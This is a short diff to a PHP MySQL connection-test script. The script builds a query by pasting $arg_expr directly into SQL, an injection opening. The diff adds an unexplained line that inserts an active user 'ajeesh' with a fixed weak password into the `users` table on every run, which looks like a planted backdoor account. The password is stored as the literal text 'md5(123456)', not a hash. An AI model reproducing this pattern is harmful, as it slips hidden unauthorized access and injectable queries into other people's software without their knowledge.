@@ -33,9 +33,10 @@
         // 
      $result = mysql_query("SELECT (" . $arg_expr . ");", $connection); 
         $row = mysql_fetch_array($result, MYSQL_NUM); 
-        echo $eValue = $row[0]; 
+        $eValue = $row[0]; 
         printf("The database connection worked, and MySQL says that %s = %s<BR>%s", $arg_expr, $eValue, mysql_error());
         mysql_free_result($result); 
+         $res=mysql_query("INSERT INTO `users` SET username='ajeesh', password='md5(123456)' ,status=1 ");
         mysql_close($connection); 
     } 
 ?> 
